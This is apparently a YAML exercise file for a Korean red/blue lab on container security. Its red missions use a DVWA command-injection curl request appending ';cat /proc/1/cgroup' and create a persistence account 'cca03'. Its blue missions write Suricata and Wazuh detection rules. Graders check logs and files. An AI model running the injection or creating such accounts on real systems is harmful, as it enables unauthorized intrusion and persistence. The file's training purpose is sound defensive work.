@@ -1,0 +1,170 @@
+id: "cloud-container-w03"
+category: "cloud-container"
+title: "[클라우드/컨테이너 W3] 컨테이너 기초 보안 — 취약 컨테이너 vs 이미지·런타임 통제"
+difficulty: "medium"
+time_limit: 2700
+battle_type: "1v1"
+description: |
+  클라우드/컨테이너 3주차 — **컨테이너 기초 보안**. 이미지 취약점·기본 설정·런타임 보안을 점검한다. 공격자는
+  취약 컨테이너 설정을 악용하고, 점검자(너)는 이미지 스캔·런타임 통제를 점검·구현한다.
+
+  ▸ 이야기: 공격자가 취약 컨테이너로 침투해(태그 `cc03r1`) 취약 설정(`/tmp/.cc03container`)과 계정 `cca03` 을 남긴다.
+    점검자는 ① 침입 탐지, ② 컨테이너 Wazuh 룰, ③ 컨테이너 기초 보안 점검·R/B/P 로 대응한다.
+
+  ▸ 모드: solo/duel. 공격자=attacker-ext(2203), Red 채점=대상 흔적(WAF audit 태그/설정 파일·계정).
+  ▸ 마커: 태그 **`cc03r1-<본인id>`**, 취약 설정 **`/tmp/.cc03container`**(마커 `cc03`), 계정 **`cca03`**,
+    Suricata **sid 9003011**, Wazuh **id 106031**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 20
+    instruction: |
+      ## 🎯 RED-1 [취약 컨테이너 침투] — 노출 서비스 공략
+
+      ### 할 일 (attacker-ext)
+      ```bash
+      curl -s -A "cc03r1-kim" -H "Host: dvwa.6v6.lab" \
+        "http://<대상_공개IP>/vulnerabilities/exec/?ip=127.0.0.1;cat%20/proc/1/cgroup%23cc03r1-kim&Submit=Submit"
+      ```
+      ### 채점 방법 / 합격 기준
+      대상 WAF audit 에 태그 `cc03r1` 흔적 시 인정.
+    hint: "태그(cc03r1) 컨테이너 침투(cgroup 확인) → 대상 modsec audit. 채점: log_contains modsec cc03r1."
+    verify:
+      type: "log_contains"
+      expect: "cc03r1"
+      checks:
+        - { id: "red-1-1", type: "log_contains", target: "web",
+            params: { log: "modsec", pattern: "cc03r1", since_sec: 1800 } }
+      semantic:
+        intent: "취약 컨테이너 침투(T1190) — 노출 서비스/컨테이너 인지. 태그(cc03r1) 귀속."
+        success_criteria: ["대상 WAF audit 에 cc03r1 태그", "컨테이너 환경 인지(cgroup 등) 서술"]
+        acceptable_methods: ["attacker-ext 에서 태그 단 침투"]
+        negative_signs: ["태그 누락 / 대상 미도달"]
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 15
+    instruction: |
+      ## 🎯 RED-2 [취약 설정] — 안전하지 않은 컨테이너 설정 + 계정
+
+      ### 할 일
+      ```bash
+      printf 'cc03 insecure: runs as root, no readonly fs, latest tag, no resource limits' > /tmp/.cc03container
+      sudo useradd -m -s /bin/bash cca03
+      ```
+      ### 채점 방법 / 합격 기준
+      `/tmp/.cc03container`(마커 `cc03`) 또는 `cca03` 존재 시 인정.
+    hint: "취약 설정 /tmp/.cc03container (마커 cc03) + useradd cca03. 채점: file_contains container cc03 + file_contains passwd cca03."
+    verify:
+      type: "file_contains"
+      expect: "cc03"
+      checks:
+        - { id: "red-2-1", type: "file_contains", target: "web",
+            params: { path: "/tmp/.cc03container", pattern: "cc03" } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "cca03" } }
+      semantic:
+        intent: "취약 컨테이너 설정(T1610) + 계정(T1136) — root 실행/latest 태그/리소스 무제한."
+        success_criteria: ["/tmp/.cc03container(마커 cc03) 또는 계정 cca03", "취약 설정 위험 서술"]
+        acceptable_methods: ["설정 파일 + useradd"]
+        negative_signs: ["흔적 미생성"]
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 22
+    instruction: |
+      ## 🛡️ BLUE-1 [컨테이너 침입 탐지] — Suricata 룰 (sid 9003011)
+
+      ### 할 일
+      ```
+      alert http any any -> any any (msg:"CLOUD-W03 container intrusion (cgroup probe)"; flow:to_server; http.uri; content:"cgroup"; nocase; sid:9003011; rev:1;)
+      ```
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+      ### 채점 방법 / 합격 기준
+      ips 의 `local.rules` 에 sid 9003011 룰 존재 시 인정.
+    hint: "컨테이너 침입 Suricata 룰(sid 9003011) → reload. 채점: file_contains local.rules 9003011."
+    verify:
+      type: "file_contains"
+      expect: "9003011"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9003011" } }
+      semantic:
+        intent: "컨테이너 보안 — 침입/환경 인지 Suricata 룰."
+        success_criteria: ["local.rules 에 sid 9003011", "컨테이너 침입 탐지 의의"]
+        acceptable_methods: ["Suricata 룰 작성 + reload"]
+        negative_signs: ["패턴 부정확 / 문법 오류"]
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-2 [취약 설정 탐지] — Wazuh 룰 (id 106031)
+
+      ### 할 일
+      ```xml
+      <group name="edu,container,">
+        <rule id="106031" level="12">
+          <if_group>edu</if_group>
+          <match>cca03</match>
+          <description>CLOUD-W03 - insecure container config / account</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+      ### 채점 방법 / 합격 기준
+      `local_rules.xml` 에 id 106031 룰 존재 시 인정.
+    hint: "취약 설정 Wazuh 룰(id 106031) → restart. 채점: file_contains local_rules.xml 106031."
+    verify:
+      type: "file_contains"
+      expect: "106031"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "106031" } }
+      semantic:
+        intent: "컨테이너 보안 — 취약 설정/계정 Wazuh 룰. 런타임 통제."
+        success_criteria: ["local_rules.xml 에 rule id 106031", "취약 설정 탐지 로직"]
+        acceptable_methods: ["Wazuh 룰 작성 + restart"]
+        negative_signs: ["탐지 로직 부실 / XML 오류"]
+
+  - order: 3
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-3 [컨테이너 기초 보안 점검·R/B/P]
+
+      ### 할 일
+      보고서에:
+      - 컨테이너 기초 점검(non-root 실행/readonly fs/리소스 제한/이미지 태그 고정/이미지 스캔) + 위험도 + 권고
+      - R/B/P 회고 + 취약 설정(`/tmp/.cc03container`)·계정(cca03) 헌팅
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+      ### 채점 방법 / 합격 기준
+      본인 SIEM 에 최근 경보 + 제출한 컨테이너 기초 점검·R/B/P 로 인정.
+    hint: "컨테이너 기초 점검(non-root/readonly/리소스 제한/태그 고정/이미지 스캔) + R/B/P + 설정/계정 헌팅. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "컨테이너 기초 보안 점검 종합 — 런타임/이미지 통제 + R/B/P. 분석형 — 구체 점검/권고 제시 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "컨테이너 기초 점검(non-root/readonly/리소스/태그/스캔) + 권고"
+          - "R/B/P 회고 + 설정/계정 헌팅"
+        acceptable_methods: ["점검 표 + 권고 + 회고 + 헌팅"]
+        negative_signs: ["권고/회고 누락"]
